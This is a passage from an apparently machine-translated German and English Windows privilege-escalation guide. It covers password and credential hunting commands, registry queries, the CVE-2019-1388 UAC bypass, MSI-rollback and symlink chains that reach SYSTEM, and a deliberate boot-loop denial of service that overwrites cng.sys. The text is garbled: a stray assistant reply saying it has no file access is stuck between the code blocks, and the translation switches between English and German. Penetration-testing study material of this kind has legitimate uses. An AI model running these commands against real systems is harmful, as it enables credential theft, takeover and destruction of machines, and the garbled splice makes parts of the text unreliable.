%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Ich habe keinen Zugriff auf dein Dateisystem oder dein Repository. Bitte füge den Inhalt von src/windows-hardening/windows-local-privilege-escalation/README.md hier ein oder sende die Liste/den Inhalt der „vorgeschlagenen Dateien“, die ich durchsuchen soll. Sobald du den Text lieferst, übersetze ich den relevanten englischen Inhalt ins Deutsche und lasse Markdown-, HTML-Tags, Links, Pfade und Code unverändert.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in the RecycleBin

Du solltest außerdem den Bin überprüfen, um nach Credentials darin zu suchen

Um **Passwörter wiederherzustellen**, die von mehreren Programmen gespeichert wurden, kannst du folgendes verwenden: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### In der Registry

**Weitere mögliche Registry-Schlüssel mit Credentials**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browser-Verlauf

Sie sollten nach dbs suchen, in denen Passwörter von **Chrome or Firefox** gespeichert sind.  
Prüfen Sie auch den Verlauf, Lesezeichen und Favoriten der Browser, da dort möglicherweise einige **Passwörter** gespeichert sind.

Tools zum Extrahieren von Passwörtern aus Browsern:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL-Überschreiben**

**Component Object Model (COM)** ist eine im Windows-Betriebssystem integrierte Technologie, die eine **Interkommunikation** zwischen Softwarekomponenten in unterschiedlichen Sprachen ermöglicht. Jede COM-Komponente wird **identified via a class ID (CLSID)** und jede Komponente stellt Funktionalität über eine oder mehrere Interfaces bereit, die über Interface-IDs (IIDs) identifiziert werden.

COM-Klassen und -Interfaces sind jeweils in der Registry unter **HKEY\CLASSES\ROOT\CLSID** und **HKEY\CLASSES\ROOT\Interface** definiert. Diese Registry entsteht durch das Zusammenführen von **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Grundsätzlich, wenn Sie **eine der DLLs überschreiben können**, die ausgeführt werden, könnten Sie **Privilegien eskalieren**, falls diese DLL von einem anderen Benutzer ausgeführt wird.

Um zu lernen, wie Angreifer COM Hijacking als Persistenzmechanismus nutzen, siehe:

{{#ref}}
com-hijacking.md
{{#endref}}

### **Generische Passwortsuche in Dateien und Registry**

**Suche nach Dateiinhalten**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Nach einer Datei mit einem bestimmten Dateinamen suchen**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Durchsuche die registry nach key names und passwords**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools, die nach Passwörtern suchen

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** Plugin. Ich habe dieses Plugin erstellt, um **automatically execute every metasploit POST module that searches for credentials** innerhalb des Opfers auszuführen.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sucht automatisch nach allen Dateien, die Passwörter enthalten und auf dieser Seite erwähnt werden.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ist ein weiteres großartiges Tool, um Passwörter aus einem System zu extrahieren.

Das Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) durchsucht nach **sessions**, **usernames** und **passwords** mehrerer Tools, die diese Daten im Klartext speichern (PuTTY, WinSCP, FileZilla, SuperPuTTY und RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Stellen Sie sich vor, dass **ein als SYSTEM laufender Prozess einen neuen Prozess öffnet** (`OpenProcess()`) mit **vollständigem Zugriff**. Der gleiche Prozess **erstellt außerdem einen neuen Prozess** (`CreateProcess()`) **mit geringen Rechten, der jedoch alle offenen Handles des Hauptprozesses erbt**.\
Wenn Sie dann **vollständigen Zugriff auf den niedrig privilegierten Prozess** haben, können Sie das **offene Handle des mit `OpenProcess()` erzeugten privilegierten Prozesses** übernehmen und **Shellcode injizieren**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gemeinsame Speicherbereiche, als **pipes** bezeichnet, ermöglichen die Kommunikation und den Datenaustausch zwischen Prozessen.

Windows bietet eine Funktion namens **Named Pipes**, die es nicht miteinander verbundenen Prozessen erlaubt, Daten auszutauschen, sogar über verschiedene Netzwerke. Das ähnelt einer Client/Server-Architektur, mit den Rollen **named pipe server** und **named pipe client**.

Wenn Daten von einem **Client** durch eine Pipe gesendet werden, kann der **Server**, der die Pipe eingerichtet hat, die Identität des **Clients** annehmen, vorausgesetzt, er besitzt die nötigen **SeImpersonate**-Rechte. Das Auffinden eines **privilegierten Prozesses**, der über eine Pipe kommuniziert, die Sie nachahmen können, bietet die Möglichkeit, durch Übernahme der Identität dieses Prozesses höhere Rechte zu erlangen, sobald er mit der von Ihnen eingerichteten Pipe interagiert. For instructions on executing such an attack, helpful guides can be found [**here**](named-pipe-client-impersonation.md) and [**here**](#from-high-integrity-to-system).

Außerdem erlaubt das folgende Tool, die Kommunikation einer named pipe mit einem Tool wie burp abzufangen: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **und dieses Tool erlaubt es, alle Pipes aufzulisten und zu sehen, um privescs zu finden** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Der Telephony-Dienst (TapiSrv) im Server-Modus exponiert `\\pipe\\tapsrv` (MS-TRP). Ein fernauthentifizierter Client kann den auf Mailslots basierenden asynchronen Ereignispfad missbrauchen, um `ClientAttach` in einen beliebigen **4-Byte-Schreibvorgang** in jede vorhandene Datei umzuwandeln, die von `NETWORK SERVICE` beschreibbar ist, anschließend Telephony-Administratorrechte zu erlangen und eine beliebige DLL als Dienst zu laden. Gesamtablauf:

- `ClientAttach` mit `pszDomainUser` gesetzt auf einen vorhandenen, beschreibbaren Pfad → der Dienst öffnet ihn via `CreateFileW(..., OPEN_EXISTING)` und verwendet ihn für asynchrone Event-Schreibvorgänge.
- Jedes Ereignis schreibt das vom Angreifer kontrollierte `InitContext` aus `Initialize` auf dieses Handle. Registrieren Sie eine line app mit `LRegisterRequestRecipient` (`Req_Func 61`), lösen Sie `TRequestMakeCall` (`Req_Func 121`) aus, holen Sie es via `GetAsyncEvents` (`Req_Func 0`), und dann abmelden/herunterfahren, um deterministische Schreibvorgänge zu wiederholen.
- Fügen Sie sich selbst zu `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini` hinzu, stellen Sie die Verbindung wieder her, und rufen Sie dann `GetUIDllName` mit einem beliebigen DLL-Pfad auf, um `TSPI_providerUIIdentify` als `NETWORK SERVICE` auszuführen.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Sonstiges

### Dateiendungen, die in Windows etwas ausführen können

Siehe die Seite **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Klickbare Markdown-Links, die an `ShellExecuteExW` weitergereicht werden, können gefährliche URI-Handler (`file:`, `ms-appinstaller:` oder beliebige registrierte Schemen) auslösen und vom Angreifer kontrollierte Dateien als aktueller Benutzer ausführen. See:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Kommandozeilen auf Passwörter überwachen**

Wenn man eine Shell als Benutzer erhält, kann es geplante Tasks oder andere Prozesse geben, die **Zugangsdaten in der Kommandozeile übergeben**. Das untenstehende Skript erfasst Prozess-Kommandozeilen alle zwei Sekunden und vergleicht den aktuellen Zustand mit dem vorherigen, wobei es eventuelle Unterschiede ausgibt.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Passwörter aus Prozessen stehlen

## Von Low Priv User zu NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Wenn Sie Zugriff auf die grafische Oberfläche (über Konsole oder RDP) haben und UAC aktiviert ist, ist es in einigen Versionen von Microsoft Windows möglich, ein Terminal oder jeden anderen Prozess wie "NT\AUTHORITY SYSTEM" als nicht privilegierter Benutzer zu starten.

Dadurch ist es möglich, mit derselben Schwachstelle die Rechte zu eskalieren und UAC gleichzeitig zu umgehen. Zusätzlich muss nichts installiert werden, und die während des Vorgangs verwendete binary ist von Microsoft signiert und ausgestellt.

Einige der betroffenen Systeme sind die folgenden:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Um diese Schwachstelle auszunutzen, sind folgende Schritte erforderlich:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Lies dies, um mehr über Integritätsstufen zu erfahren:


{{#ref}}
integrity-levels.md
{{#endref}}

Lies dann dies, um mehr über UAC und UAC bypasses zu erfahren:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

Die in [**diesem Blogpost**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) beschriebene Technik mit einem Exploit-Code [**hier verfügbar**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Der Angriff besteht im Wesentlichen darin, die Rollback-Funktion des Windows Installer zu missbrauchen, um legitime Dateien während des Deinstallationsprozesses durch bösartige zu ersetzen. Dazu muss der Angreifer ein **bösartiges MSI-Installer** erstellen, das verwendet wird, um den `C:\Config.Msi`-Ordner zu kapern. Dieser Ordner wird später vom Windows Installer verwendet, um Rollback-Dateien während der Deinstallation anderer MSI-Pakete zu speichern, wobei diese Rollback-Dateien so verändert wurden, dass sie die bösartige Nutzlast enthalten.

Die zusammengefasste Technik ist wie folgt:

1. **Stage 1 – Vorbereitung der Hijack (lass `C:\Config.Msi` leer)**

- Step 1: Install the MSI
- Erstelle eine `.msi`, die eine harmlose Datei (z. B. `dummy.txt`) in einem beschreibbaren Ordner (`TARGETDIR`) installiert.
- Markiere den Installer als **"UAC Compliant"**, sodass ein **non-admin user** ihn ausführen kann.
- Halte nach der Installation einen **Handle** auf die Datei offen.

- Step 2: Begin Uninstall
- Deinstalliere dieselbe `.msi`.
- Der Deinstallationsprozess beginnt damit, Dateien nach `C:\Config.Msi` zu verschieben und sie in `.rbf`-Dateien (Rollback-Backups) umzubenennen.
- **Poll the open file handle** mit `GetFinalPathNameByHandle`, um zu erkennen, wann die Datei zu `C:\Config.Msi\<random>.rbf` wird.

- Step 3: Custom Syncing
- Die `.msi` enthält eine **custom uninstall action (`SyncOnRbfWritten`)**, die:
- signalisiert, wenn `.rbf` geschrieben wurde.
- und dann auf ein weiteres Event **wartet**, bevor sie mit der Deinstallation fortfährt.

- Step 4: Block Deletion of `.rbf`
- Wenn signalisiert, **öffne die `.rbf`-Datei** ohne `FILE_SHARE_DELETE` — das **verhindert, dass sie gelöscht wird**.
- Dann **signalisiere zurück**, sodass die Deinstallation abschließen kann.
- Der Windows Installer kann die `.rbf` nicht löschen, und weil er nicht alle Inhalte löschen kann, wird **`C:\Config.Msi` nicht entfernt**.

- Step 5: Manually Delete `.rbf`
- Du (Angreifer) löscht die `.rbf`-Datei manuell.
- Jetzt ist **`C:\Config.Msi` leer** und bereit zur Kapern.

> An diesem Punkt **trigger** die SYSTEM-level arbitrary folder delete vulnerability, um `C:\Config.Msi` zu löschen.

2. **Stage 2 – Ersetzen von Rollback-Skripten durch bösartige**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Erstelle den Ordner `C:\Config.Msi` selbst neu.
- Setze **schwache DACLs** (z. B. Everyone:F), und **halte einen Handle offen** mit `WRITE_DAC`.

- Step 7: Run Another Install
- Installiere die `.msi` erneut, mit:
- `TARGETDIR`: beschreibbarer Ort.
- `ERROROUT`: Eine Variable, die einen erzwungenen Fehler auslöst.
- Diese Installation wird verwendet, um erneut einen **rollback** auszulösen, der `.rbs` und `.rbf` liest.

- Step 8: Monitor for `.rbs`
- Verwende `ReadDirectoryChangesW`, um `C:\Config.Msi` zu überwachen, bis eine neue `.rbs` erscheint.
- Erfasse dessen Dateinamen.

- Step 9: Sync Before Rollback
- Die `.msi` enthält eine **custom install action (`SyncBeforeRollback`)**, die:
- ein Event signalisiert, wenn die `.rbs` erstellt wurde.
- und dann **wartet**, bevor sie fortfährt.

- Step 10: Reapply Weak ACL
- Nachdem das `rbs created`-Event empfangen wurde:
- Der Windows Installer **wendet starke ACLs erneut auf `C:\Config.Msi` an**.
- Da du jedoch noch einen Handle mit `WRITE_DAC` geöffnet hast, kannst du **wieder schwache ACLs anwenden**.

> ACLs werden **nur beim Öffnen eines Handles durchgesetzt**, daher kannst du weiterhin in den Ordner schreiben.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Überschreibe die `.rbs`-Datei mit einem **gefälschten Rollback-Skript**, das Windows anweist:
- deine `.rbf`-Datei (bösartige DLL) in einen **privilegierten Pfad** wiederherzustellen (z. B. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Lege deine gefälschte `.rbf` ab, die eine **bösartige SYSTEM-Level Payload DLL** enthält.

- Step 12: Trigger the Rollback
- Signalisiere das Sync-Event, sodass der Installer fortfährt.
- Eine **type 19 custom action (`ErrorOut`)** ist so konfiguriert, dass die Installation an einem bekannten Punkt **absichtlich fehlschlägt**.
- Das verursacht, dass der **Rollback beginnt**.

- Step 13: SYSTEM Installs Your DLL
- Der Windows Installer:
- liest dein bösartiges `.rbs`.
- kopiert deine `.rbf`-DLL in den Zielpfad.
- Du hast nun deine **bösartige DLL in einem von SYSTEM geladenen Pfad**.

- Final Step: Execute SYSTEM Code
- Führe ein vertrauenswürdiges **auto-elevated binary** aus (z. B. `osk.exe`), das die von dir hijackte DLL lädt.
- **Boom**: Dein Code wird **als SYSTEM** ausgeführt.

### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Die Haupt-MSI-Rollback-Technik (die vorherige) geht davon aus, dass du einen **gesamten Ordner** löschen kannst (z. B. `C:\Config.Msi`). Aber was, wenn deine Schwachstelle nur **arbitrary file deletion** erlaubt?

Du könntest die **NTFS-Interna** ausnutzen: Jeder Ordner hat einen versteckten alternativen Datenstrom namens:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Dieser Stream speichert die **Index-Metadaten** des Ordners.

Wenn du **den `::$INDEX_ALLOCATION`-Stream eines Ordners löschst**, entfernt NTFS **den gesamten Ordner** aus dem Dateisystem.

Das kannst du mit standardmäßigen Datei-Lösch-APIs wie:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Auch wenn du eine *file*-Lösch-API aufrufst, löscht sie **den Ordner selbst**.

### Von Folder Contents Delete zu SYSTEM EoP
Was, wenn deine Primitive es dir nicht erlaubt, beliebige Dateien/Ordner zu löschen, aber sie **das Löschen der *contents* eines vom Angreifer kontrollierten Ordners** erlaubt?

1. Schritt 1: Richte einen Köderordner und eine Datei ein
- Erstelle: `C:\temp\folder1`
- Darin: `C:\temp\folder1\file1.txt`

2. Schritt 2: Setze einen **oplock** auf `file1.txt`
- Der oplock **pausiert die Ausführung**, wenn ein privilegierter Prozess versucht, `file1.txt` zu löschen.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Schritt 3: SYSTEM-Prozess auslösen (z. B. `SilentCleanup`)
- Dieser Prozess durchsucht Ordner (z. B. `%TEMP%`) und versucht, deren Inhalte zu löschen.
- Wenn es `file1.txt` erreicht, **oplock löst aus** und übergibt die Kontrolle an deinen Callback.

4. Schritt 4: Innerhalb des oplock-callbacks – Löschung umleiten

- Option A: Verschiebe `file1.txt` an einen anderen Ort
- Dadurch wird `folder1` geleert, ohne den oplock zu brechen.
- Lösche `file1.txt` nicht direkt — das würde den oplock vorzeitig freigeben.

- Option B: Konvertiere `folder1` in eine **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: Erstelle einen **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Dies zielt auf den NTFS-internen Stream ab, der Ordner-Metadaten speichert — seine Löschung löscht den Ordner.

5. Schritt 5: Oplock freigeben
- Der SYSTEM-Prozess fährt fort und versucht, `file1.txt` zu löschen.
- Aber jetzt löscht er aufgrund der junction + symlink tatsächlich:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Ergebnis**: `C:\Config.Msi` wird von SYSTEM gelöscht.

### Von Arbitrary Folder Create zu Permanent DoS

Nutze ein Primitiv, das es dir erlaubt, **create an arbitrary folder as SYSTEM/admin** — selbst wenn du **keine Dateien schreiben kannst** oder **keine schwachen Berechtigungen setzen kannst**.

Erstelle einen **Ordner** (nicht eine Datei) mit dem Namen eines **kritischen Windows driver**, z. B.:
```
C:\Windows\System32\cng.sys
```
- Dieser Pfad entspricht normalerweise dem Kernel-Modus-Treiber `cng.sys`.
- Wenn Sie ihn **vorab als Ordner anlegen**, kann Windows den eigentlichen Treiber beim Booten nicht laden.
- Danach versucht Windows, `cng.sys` während des Bootvorgangs zu laden.
- Es sieht den Ordner, **kann den eigentlichen Treiber nicht auflösen**, und **stürzt ab oder bleibt beim Boot hängen**.
- Es gibt **kein Fallback** und **keine Wiederherstellung** ohne externe Intervention (z. B. Boot-Reparatur oder Festplattenzugriff).

### From privileged log/backup paths + OM symlinks to arbitrary file overwrite / boot DoS

Wenn ein **privilegierter Dienst** Logs/Exports in einen Pfad schreibt, der aus einer **beschreibbaren Konfiguration** gelesen wird, leiten Sie diesen Pfad mit **Object Manager symlinks + NTFS mount points** um, um den privilegierten Schreibvorgang in ein beliebiges Überschreiben zu verwandeln (sogar **ohne** SeCreateSymbolicLinkPrivilege).

**Anforderungen**
- Die Konfiguration, die den Zielpfad speichert, ist vom Angreifer beschreibbar (z. B. `%ProgramData%\...\.ini`).
- Fähigkeit, einen Mountpoint zu `\RPC Control` und einen OM-Datei-Symlink zu erstellen (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Eine privilegierte Operation, die in diesen Pfad schreibt (Log, Export, Report).

**Beispielkette**
1. Die Konfiguration lesen, um das privilegierte Log-Ziel zu ermitteln, z. B. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Den Pfad ohne Admin umleiten:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Warten Sie, bis die privilegierte Komponente das Log schreibt (z. B. Admin löst "send test SMS" aus). Der Schreibvorgang landet nun in `C:\Windows\System32\cng.sys`.
4. Untersuchen Sie das überschriebene Ziel (Hex/PE-Parser), um die Beschädigung zu bestätigen; ein Reboot zwingt Windows, den manipulierten Treiberpfad zu laden → **boot loop DoS**. Dies verallgemeinert sich auch auf jede geschützte Datei, die ein privilegierter Dienst zum Schreiben öffnen wird.

> `cng.sys` wird normalerweise aus `C:\Windows\System32\drivers\cng.sys` geladen, aber wenn eine Kopie in `C:\Windows\System32\cng.sys` existiert, kann diese zuerst versucht werden, wodurch sie eine zuverlässige DoS-Senke für korrupte Daten darstellt.



## **Von High Integrity zu System**

### **Neuer Service**

Wenn Sie bereits in einem High Integrity-Prozess laufen, kann der **Pfad zu SYSTEM** sehr einfach sein: einfach einen neuen Service erstellen und ausführen:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Wenn du ein Service-Binary erstellst, stelle sicher, dass es ein gültiger Service ist oder dass das Binary die notwendigen Aktionen schnell ausführt, da es sonst nach 20s beendet wird.

### AlwaysInstallElevated

Von einem High Integrity-Prozess aus kannst du versuchen, **die AlwaysInstallElevated Registry-Einträge zu aktivieren** und eine Reverse-Shell mit einem _**.msi**_ Wrapper **zu installieren**.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Du kannst** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Wenn du diese Token-Privilegien hast (wahrscheinlich findest du sie bereits in einem High Integrity-Prozess), kannst du mit dem SeDebug-Privileg **fast jeden Prozess öffnen** (außer geschützte Prozesse), das Token des Prozesses **kopieren** und einen **beliebigen Prozess mit diesem Token** erstellen.\
Bei der Verwendung dieser Technik **wählt man normalerweise einen Prozess, der als SYSTEM läuft und alle Token-Privilegien hat** (_ja, du kannst SYSTEM-Prozesse finden, die nicht alle Token-Privilegien besitzen_).\
**Du kannst ein** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Diese Technik wird von meterpreter in `getsystem` verwendet, um zu eskalieren. Die Technik besteht darin, **eine Pipe zu erstellen und dann einen Service zu erstellen/auszunutzen, damit dieser in die Pipe schreibt**. Dann kann der **Server**, der die Pipe mit dem **`SeImpersonate`**-Privileg erstellt hat, das Token des Pipe-Clients (des Service) übernehmen und SYSTEM-Rechte erlangen.\
Wenn du [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
Wenn du ein Beispiel lesen willst, wie man von High Integrity zu System mit Named Pipes kommt, lies [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Wenn es dir gelingt, **eine DLL zu hijacken**, die von einem als **SYSTEM** laufenden **Prozess** geladen wird, kannst du beliebigen Code mit diesen Rechten ausführen. Daher ist Dll Hijacking auch für diese Art der Privilege-Eskalation nützlich und zudem deutlich **leichter von einem High Integrity-Prozess aus zu erreichen**, da dieser **Schreibrechte** auf die Ordner hat, die zum Laden von DLLs verwendet werden.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Lies:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Mehr Hilfe

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Nützliche Tools

**Bestes Tool, um nach Windows local privilege escalation vectors zu suchen:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Prüft auf Fehlkonfigurationen und sensitive Dateien (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Erkannt.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Prüft auf mögliche Fehlkonfigurationen und sammelt Informationen (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Prüft auf Fehlkonfigurationen**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrahiert PuTTY, WinSCP, SuperPuTTY, FileZilla und RDP gespeicherte Sitzungsinformationen. Lokal mit -Thorough verwenden.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrahiert Anmeldeinformationen aus dem Credential Manager. Erkannt.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Verteilt gesammelte Passwörter über die Domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ist ein PowerShell ADIDNS/LLMNR/mDNS Spoofer und Man-in-the-Middle-Tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Grundlegende privesc Windows-Enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Sucht nach bekannten privesc-Schwachstellen (VERALTET zugunsten von Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale Checks **(Braucht Admin-Rechte)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Sucht nach bekannten privesc-Schwachstellen (muss mit VisualStudio kompiliert werden) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Durchsucht den Host nach Fehlkonfigurationen (mehr ein Informationssammler als reines privesc-Tool) (muss kompiliert werden) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrahiert Anmeldeinformationen aus vielen Programmen (precompiled exe im GitHub-Repo)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port von PowerUp nach C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Prüft auf Fehlkonfigurationen (ausführbare Datei precompiled im GitHub-Repo). Nicht empfohlen. Funktioniert unter Win10 nicht gut.\
